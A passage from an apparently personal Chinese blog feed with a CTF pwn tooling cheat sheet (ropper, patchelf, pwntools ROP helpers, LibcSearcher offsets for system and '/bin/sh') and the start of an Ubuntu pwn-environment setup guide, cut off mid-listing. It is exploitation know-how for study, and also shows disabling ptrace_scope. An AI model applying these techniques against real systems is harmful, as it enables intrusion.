title="ropper"></a>ropper</h2><p>可以先使用<code>ropper</code>直接进入程序内部</p><p>再使用其他命令</p><h3 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h3><p>亦或者直接</p><p><code>ropper --file filename --string &#39;/bin/sh&#39;</code></p><p><code>ropper --file filename --search &#39;asm_code&#39;</code></p><p>指令可以指搜索部分例如<code>mov rdx</code>,也可以搜索更全<code>mov rdx, rdi</code>亦或者多条<code>mov rdx, rdi; mov rdi, rax;</code>要注意<strong>空格,逗号,分号</strong>的位置,不然搜不到</p><p><strong>?和%的用法:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[Search]</span><br><span class="line">./Ropper.py --file /bin/ls --search &lt;searchstring&gt;</span><br><span class="line">?     any character</span><br><span class="line">%     any string</span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line"></span><br><span class="line">./Ropper.py --file /bin/ls --search &quot;mov e?x&quot;</span><br><span class="line">0x000067f1: mov edx, dword ptr [ebp + 0x14]; mov dword ptr [esp], edx; call eax</span><br><span class="line">0x00006d03: mov eax, esi; pop ebx; pop esi; pop edi; pop ebp; ret ;</span><br><span class="line">0x00006d6f: mov ebx, esi; mov esi, dword ptr [esp + 0x18]; add esp, 0x1c; ret ;</span><br><span class="line">0x000076f8: mov eax, dword ptr [eax]; mov byte ptr [eax + edx], 0; add esp, 0x18; pop ebx; ret ;</span><br><span class="line"></span><br><span class="line">./Ropper.py --file /bin/ls --search &quot;mov [%], edx&quot;</span><br><span class="line">0x000067ed: mov dword ptr [esp + 4], edx; mov edx, dword ptr [ebp + 0x14]; mov dword ptr [esp], edx; call eax;</span><br><span class="line">0x00006f4e: mov dword ptr [ecx + 0x14], edx; add esp, 0x2c; pop ebx; pop esi; pop edi; pop ebp; ret ;</span><br><span class="line">0x000084b8: mov dword ptr [eax], edx; ret ;</span><br><span class="line">0x00008d9b: mov dword ptr [eax], edx; add esp, 0x18; pop ebx; ret ;</span><br><span class="line"></span><br><span class="line">./Ropper.py --file /bin/ls --search &quot;mov [%], edx&quot; --quality 1</span><br><span class="line">0x000084b8: mov dword ptr [eax], edx; ret ;; ret ;</span><br></pre></td></tr></table></figure><p>感觉比ROPgadget要好用一点</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>ropper还附带许多功能,例如asm和disasm等,不过用得比较多的还是gadget</p><p>更多详见说明文档</p><h2 id="strace"><a href="#strace" class="headerlink" title="strace"></a>strace</h2><h2 id="linux自带"><a href="#linux自带" class="headerlink" title="linux自带"></a>linux自带</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">readelf 读取基本信息</span><br><span class="line">file  读取基本信息</span><br><span class="line">strings 读取文件字符串</span><br><span class="line">ldd  查看文件使用的libc库和ld链接器</span><br><span class="line">objdump 反汇编指令</span><br><span class="line">nm  列出符号表</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th>工具</th><th>功能</th></tr></thead><tbody><tr><td>strace</td><td>跟踪程序执行过程中产生的系统调用及接收到的信号</td></tr><tr><td>readelf</td><td>用于查看ELF格式的文件信息</td></tr><tr><td>file</td><td>用于辨识文件类型</td></tr><tr><td>objdump</td><td>以一种可阅读的格式让你更多地了解二进制文件可能带有的附加信息</td></tr><tr><td>ldd</td><td>列出一个程序所需要得动态链接库</td></tr><tr><td>hexdump</td><td>hexdump主要用来查看“二进制”文件的十六进制编码</td></tr><tr><td>ar</td><td>创建静态库，插入/删除/列出/提取 成员函数</td></tr><tr><td>strings</td><td>列出目标文件中所有可打印的字符串</td></tr><tr><td>nm</td><td>列出目标文件中符号表所定义的符号</td></tr><tr><td>strip</td><td>从目标文件中删除符号表的信息</td></tr><tr><td>size</td><td>列出目标文件中各个段的大小</td></tr></tbody></table></div><h2 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h2><p>ldd查看libc和ld路径(file和readelf指令也行)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">linux:~/pwn$ ldd elf</span><br><span class="line">linux-vdso.so.1 (0x00007fffd31d7000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007efc8b627000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007efc8b834000)</span><br></pre></td></tr></table></figure><p>patchelf使用</p><p><strong>ld切换</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter /home/aichch/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/ld-2.31.so[绝对路径] ./elf</span><br></pre></td></tr></table></figure><p><strong>libc切换</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed libc.so.6[符号] /home/aichch/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so[绝对路径] ./elf</span><br></pre></td></tr></table></figure><p><strong>也有这样修改libc的</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-rpath /home/aichch/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so[绝对路径] ./elf</span><br></pre></td></tr></table></figure><p><strong><code>patchelf --set-rpath</code></strong> 的作用是 在ELF文件的 <strong>Dynamic section</strong> 的中添加一个 <strong>RUNPATH</strong> 段里面储存着动态链接库的绝对路径，即设置程序的动态链接库</p><p>readelf -d ./elf 查看runpath和needed</p><p><strong><u>ld版本与libc版本要对应</u></strong></p><p>不过有时替换了之后，ldd会显示不是可执行文件，但却可以正常运行</p><h2 id="glibc-all-one"><a href="#glibc-all-one" class="headerlink" title="glibc_all_one"></a>glibc_all_one</h2><p>更新</p><p><code>./update_list</code></p><p>下载</p><p><code>./download libc</code>_name</p><h2 id="其他来源glibc安装"><a href="#其他来源glibc安装" class="headerlink" title="其他来源glibc安装"></a>其他来源glibc安装</h2><p>glibc-2.23为例</p><p>解压<br><code>tar xvf glibc-2.23.tar.gz</code></p><p>进入解压目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd glibc-2.23</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br></pre></td></tr></table></figure><p><strong>选择带 debug symobl 以及配置好安装位置</strong></p><p><code>CFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og -w&quot; CXXFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og -w&quot; ../configure --prefix=/home/aichch/glibc_all_one/libs/glibc-2.23/</code></p><p>CFLAGS、CXXFLAGS 与 debug symobl 有关</p><p>—prefix 是安装目录</p><p><strong>编译安装</strong></p><p><code>make &amp;&amp; make install</code></p><p>若出现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/tmp/ccPRCqlU.s: Error: `loc1@GLIBC_2.2.5&#x27; can&#x27;t be versioned to common symbol &#x27;loc1&#x27;</span><br><span class="line">/tmp/ccPRCqlU.s: Error: `loc2@GLIBC_2.2.5&#x27; can&#x27;t be versioned to common symbol &#x27;loc2&#x27;</span><br><span class="line">/tmp/ccPRCqlU.s: Error: `locs@GLIBC_2.2.5&#x27; can&#x27;t be versioned to common symbol &#x27;locs&#x27;</span><br></pre></td></tr></table></figure><p>解决方案就是在 <code>/misc/regexp.c</code> 中增改几行代码</p><p>做如下修改</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/misc/regexp.c b/misc/regexp.c</span><br><span class="line">index <span class="number">19</span>d76c0.<span class="number">.9017</span>bc1 <span class="number">100644</span></span><br><span class="line">--- a/misc/regexp.c</span><br><span class="line">+++ b/misc/regexp.c</span><br><span class="line">@@ <span class="number">-29</span>,<span class="number">14</span> +<span class="number">29</span>,<span class="number">17</span> @@ </span><br><span class="line"> </span><br><span class="line"> <span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_23)</span></span><br><span class="line"> </span><br><span class="line">-<span class="comment">/* Define the variables used for the interface.  */</span></span><br><span class="line">-<span class="type">char</span> *loc1;</span><br><span class="line">-<span class="type">char</span> *loc2;</span><br><span class="line">+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span><span class="comment">/* Get NULL.  */</span></span></span><br><span class="line">+</span><br><span class="line">+<span class="comment">/* Define the variables used for the interface.  Avoid .symver on common</span></span><br><span class="line"><span class="comment">+   symbol, which just creates a new common symbol, not an alias.  */</span></span><br><span class="line">+<span class="type">char</span> *loc1 = <span class="literal">NULL</span>;</span><br><span class="line">+<span class="type">char</span> *loc2 = <span class="literal">NULL</span>;</span><br><span class="line"> compat_symbol (libc, loc1, loc1, GLIBC_2_0);</span><br><span class="line"> compat_symbol (libc, loc2, loc2, GLIBC_2_0);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/* Although we do not support the use we define this variable as well.  */</span></span><br><span class="line">-<span class="type">char</span> *locs;</span><br><span class="line">+<span class="type">char</span> *locs = <span class="literal">NULL</span>;</span><br><span class="line"> compat_symbol (libc, locs, locs, GLIBC_2_0);</span><br></pre></td></tr></table></figure><h1 id="python包"><a href="#python包" class="headerlink" title="python包"></a>python包</h1><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><h3 id="数据接收与发送"><a href="#数据接收与发送" class="headerlink" title="数据接收与发送"></a>数据接收与发送</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sh.recv(numb = 2048, timeout = dufault)  接受数据，numb指定接收的字节，timeout指定超时</span><br><span class="line">sh.recvline(keepends=True)  接受一行数据，keepends为是否保留行尾的\n</span><br><span class="line">sh.recvuntil(b&quot;Hello,World\n&quot;,drop=fasle)  接受数据直到设置的标志出现，drop表示是否接收标志，默认接收</span><br><span class="line">sh.recvall()  一直接收直到EOF</span><br><span class="line">sh.recvrepeat(timeout = default)  持续接受直到EOF或timeout</span><br><span class="line">sh.interactive()  直接进行交互，相当于回到shell的模式，在取得shell之后使用</span><br><span class="line">send(data) - 发送数据</span><br><span class="line">sendline(line) - 发送数据加一个换行</span><br><span class="line">u64()/u32()  打包</span><br><span class="line">p64()/p32()  解包</span><br><span class="line">flat()      平坦化处理数据,会自动小端序但需要指定context.arch,否则默认4字节</span><br></pre></td></tr></table></figure><p>补充一下与python字符串切片的联合使用</p><p>python字符串下标也是从0开始,str[a:b]是左取右不取,即如[1:5]表示第2个到第5个字符,负数表示倒数第几个,例如[-6:]表示从倒数第6个到结束,左边为空代表从头开始,右边为空代表到结束为止</p><p>以及<strong>左对齐ljust</strong>,<strong>右对齐rjust</strong></p><h3 id="针对elf的处理"><a href="#针对elf的处理" class="headerlink" title="针对elf的处理"></a>针对elf的处理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">symbols[&#x27;a_function&#x27;] 找到 a_function 的地址</span><br><span class="line">##libc.symbols[&#x27;read&#x27;]</span><br><span class="line">got[&#x27;a_function&#x27;] 找到 a_function的 got</span><br><span class="line">##elf.got[&quot;read&quot;]</span><br><span class="line">plt[&#x27;a_function&#x27;] 找到 a_function 的 plt</span><br><span class="line">##elf.plt[&quot;read&quot;]</span><br><span class="line">next(e.search(&quot;some_characters&quot;)) 找到包含 some_characters（字符串，汇编代码或者某个数值）的地址</span><br><span class="line">##libc.next(e.search(&quot;/bin/sh&quot;))</span><br></pre></td></tr></table></figure><h3 id="context及log"><a href="#context及log" class="headerlink" title="context及log"></a>context及log</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = &#x27;DEBUG&#x27;</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">context.binary=&#x27;&#x27;根据二进制文件自动获取环境变量</span><br><span class="line">context.terminal(&#x27;gnome-terminal&#x27;,&#x27;-x&#x27;,&#x27;sh&#x27;,&#x27;-c&#x27;)新终端参数</span><br><span class="line">log.success(&quot;&quot;)  打印信息</span><br></pre></td></tr></table></figure><h3 id="与gdb联合"><a href="#与gdb联合" class="headerlink" title="与gdb联合"></a>与gdb联合</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb.attach()</span><br><span class="line">可以加入一些命令,例如gdb.attach(p,&#x27;b system&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Linux 系统有一个叫做trace_scope的设置，它可以阻止非子进程的进程被调试。Pwntools 对于它自己启动的任何进程都能解决这个问题，但是如果你必须在 Pwntools 之外启动一个进程，并试图通过 pid 附加到它（例如gdb.attach(1)），可能被阻止附加。</span><br><span class="line"></span><br><span class="line">可以通过禁用安全设置和重启机器来解决这个问题：</span><br><span class="line"></span><br><span class="line">sudo tee /etc/sysctl.d/10-ptrace.conf &lt;&lt;EOF</span><br><span class="line">kernel.yama.ptrace_scope = 0</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><h3 id="ROP链"><a href="#ROP链" class="headerlink" title="ROP链"></a>ROP链</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rop=ROP(&#x27;&#x27;)  创建一个rop对象</span><br><span class="line">rop.raw()   填充padding</span><br><span class="line">rop.call(&#x27;函数&#x27;,[arg1,arg2,arg3])  调用函数</span><br><span class="line">#对一些常见函数也可以直接</span><br><span class="line">#rop.read(arg1,arg2,arg3)</span><br><span class="line">#rop.write(arg1,arg2,arg3)</span><br><span class="line">rop.unresolve(&#x27;&#x27;) 返回符号的地址</span><br><span class="line">rop.chain()  返回完整的rop链</span><br><span class="line">rop.migrate(base_stage) 将程序流程转移到 base_stage（地址）,栈迁移?</span><br><span class="line">rop.dump() 直观地展示当前的 rop 链</span><br></pre></td></tr></table></figure><h3 id="pwntools附带的一些功能"><a href="#pwntools附带的一些功能" class="headerlink" title="pwntools附带的一些功能"></a>pwntools附带的一些功能</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">checksec 检查保护</span><br><span class="line">ROPgadget  gadget查找</span><br></pre></td></tr></table></figure><h2 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">libc = LibcSearcher(&quot;函数名&quot;,函数真实地址)</span><br><span class="line"></span><br><span class="line">libcbase = 函数真实地址 – libc.dump(&quot;函数名&quot;)</span><br><span class="line">system_addr = libcbase + libc.dump(&quot;system&quot;)            #system 偏移</span><br><span class="line">bin_sh_addr = libcbase + libc.dump(&quot;str_bin_sh&quot;)         #/bin/sh 偏移</span><br></pre></td></tr></table></figure><h1 id="python方法"><a href="#python方法" class="headerlink" title="python方法"></a>python方法</h1><h2 id="to-bytes"><a href="#to-bytes" class="headerlink" title="to_bytes"></a>to_bytes</h2><p>to_bytes方法的语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">to_bytes(length, byteorder, signed=False)</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>length</code>：生成的字节序列的长度（以字节为单位）。如果整数无法表示为指定长度的字节序列，则会引发<code>OverflowError</code>。</li><li><code>byteorder</code>：指定字节序，可以是<code>&#39;big&#39;</code>（大端序）或<code>&#39;little&#39;</code>（小端序）。</li><li><code>signed</code>（可选）：指示是否使用有符号整数表示。默认为<code>False</code>，表示使用无符号整数。</li></ul><h2 id="int-from-bytes"><a href="#int-from-bytes" class="headerlink" title="int.from_bytes"></a>int.from_bytes</h2><p>与to_bytes相对</p><p><code>int.from_bytes</code>的语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int.from_bytes(bytes, byteorder, signed=False)</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>bytes</code>：要转换的字节序列。</li><li><code>byteorder</code>：指定字节序，可以是<code>&#39;big&#39;</code>（大端序）或<code>&#39;little&#39;</code>（小端序）。</li><li><code>signed</code>（可选）：指示是否使用有符号整数表示。默认为<code>False</code>，表示使用无符号整数。</li></ul><h2 id="bytes构造"><a href="#bytes构造" class="headerlink" title="bytes构造"></a>bytes构造</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">obj=<span class="built_in">bytes</span>(<span class="string">&#x27;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment">#构造字节串</span></span><br><span class="line"><span class="built_in">bytes</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment">#将字节串解码为字符串，使用指定的编码。</span></span><br><span class="line"><span class="built_in">bytes</span>.replace(old, new)</span><br><span class="line"><span class="comment">#替换字节串中的指定子字节串为新的子字节串。</span></span><br><span class="line"><span class="built_in">bytes</span>.split(sep=<span class="literal">None</span>, maxsplit)</span><br><span class="line"><span class="comment">#根据指定的分隔符将字节串拆分为多个子字节串。</span></span><br><span class="line"><span class="built_in">bytes</span>.<span class="built_in">hex</span>()</span><br><span class="line"><span class="comment">#转为十六进制形式</span></span><br></pre></td></tr></table></figure><h2 id="strip"><a href="#strip" class="headerlink" title="strip"></a>strip</h2><p>在Python中，<code>strip()</code>是字符串对象的方法之一，用于移除字符串的首尾空白字符（空格、制表符、换行符等）。它返回一个新的字符串，其中移除了原始字符串中的空白字符。</p><p><code>strip()</code>方法的语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string.strip([characters])</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>characters</code>（可选）：指定要移除的字符集合。如果提供了该参数，<code>strip()</code>方法将从字符串的开头和结尾依次移除指定的字符。如果未提供该参数，则默认移除所有的空白字符。</li></ul><h2 id="切片"><a href="#切片" class="headerlink" title="切片[:]"></a>切片[:]</h2><p>切片使用方括号（[]）来表示，其中包含三个部分：起始索引、结束索引和步长。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sequence[start:stop:step]</span><br></pre></td></tr></table></figure><ul><li><code>start</code>：切片的起始索引（包含在切片内）。如果未提供，则默认为0（序列的开头）。</li><li><code>stop</code>：切片的结束索引（不包含在切片内）。如果未提供，则默认为序列的长度。</li><li><code>step</code>：切片的步长（可选）。它指定了每个元素之间的间隔，默认为1。</li></ul><p><strong>obj[::-1]颠倒顺序</strong></p><ol><li>切片索引是基于零的，即第一个元素的索引为0，第二个为1，依此类推。</li><li>如果起始索引超过序列的长度，将返回一个空序列。</li><li>如果结束索引超过序列的长度，切片将一直延伸到序列的末尾。</li><li><strong>切片的步长可以是负数，这将导致从序列的末尾开始向前提取元素。</strong></li><li>生成的切片序列将是原始序列的一部分，并且与原始序列共享相同的元素对象。</li></ol><p>注意切片中<code>-n</code>就代表倒数第<code>n</code>个成员,但<code>n</code>代表第<code>n+1</code>个成员,且奉行左取右不取</p>]]></content>
      
      
      <categories>
          
          <category> 杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
            <tag> 工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn环境准备</title>
      <link href="/posts/6947/"/>
      <url>/posts/6947/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>原本用的虚拟机不知道怎么抽风了，弄了半天没弄好😣，干脆一不做二不休删了重新安装(已经不知道第多少次了),顺便记录下环境搭建过程.因为用惯了ubuntu20所以这次的版本是20.04.04。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="设置超级用户"><a href="#设置超级用户" class="headerlink" title="设置超级用户"></a>设置超级用户</h2><p><code>sudo passwd root</code></p><h2 id="先换个源"><a href="#先换个源" class="headerlink" title="先换个源"></a>先换个源</h2><p>备份一下旧的</p><p><code>sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak</code></p><p>编辑</p><p><code>sudo gedit /etc/apt/sources.list</code></p><p>我选择阿里的源,感觉还过得去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 阿里云镜像源</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure><p>这里又踩了个大坑</p><p>得先用<code>lsb_release -c</code>看看自己的ubuntu是哪个版本</p><p>我的是focal之前却用的bionic的源</p><p>就出现了装什么都出错的冥场面</p><h2 id="pip换源"><a href="#pip换源" class="headerlink" title="pip换源"></a>pip换源</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p ~/.pip/</span><br><span class="line">vim ~/.pip/pip.conf</span><br></pre></td></tr></table></figure><p>内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">trusted-host = pypi.tuna.tsinghua.edu.cn</span><br></pre></td></tr></table></figure><h2 id="python-is-python3"><a href="#python-is-python3" class="headerlink" title="python-is-python3"></a>python-is-python3</h2><p><code>sudo apt install python-is-python3</code></p><h2 id="安装vim"><a href="#安装vim" class="headerlink" title="安装vim"></a>安装vim</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install vim</span><br></pre></td></tr></table></figure><h2 id="安装gcc"><a href="#安装gcc" class="headerlink" title="安装gcc"></a>安装gcc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc</span><br><span class="line">gcc --version  </span><br></pre></td></tr></table></figure><h2 id="配置32位环境"><a href="#配置32位环境" class="headerlink" title="配置32位环境"></a>配置32位环境</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt install build-essential</span><br><span class="line">sudo apt install gcc-multilib</span><br></pre></td></tr></table></figure><h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install git</span><br></pre></td></tr></table></figure><h2 id="安装pwntools"><a href="#安装pwntools" class="headerlink" title="安装pwntools"></a>安装pwntools</h2><p>两种方法</p><p>第一种</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">sudo python3 -m pip install --upgrade pip</span><br><span class="line">sudo python3 -m pip install --upgrade pwntools</span><br></pre></td></tr></table></figure><p>第二种</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Gallopsled/pwntools</span><br><span class="line">cd pwntools</span><br><span class="line">sudo python setup.py install #这一步最好挂魔法</span><br></pre></td></tr></table></figure><h2 id="安装capstone"><a href="#安装capstone" class="headerlink" title="安装capstone"></a>安装capstone</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/aquynh/capstone</span><br><span class="line">cd capstone</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h2 id="pwndbg与pwngdb"><a href="#pwndbg与pwngdb" class="headerlink" title="pwndbg与pwngdb"></a>pwndbg与pwngdb</h2><p>pwngdb</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~/</span><br><span class="line">git clone https://github.com/scwuaptx/Pwngdb.git </span><br><span class="line">cp ~/Pwngdb/.gdbinit ~/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 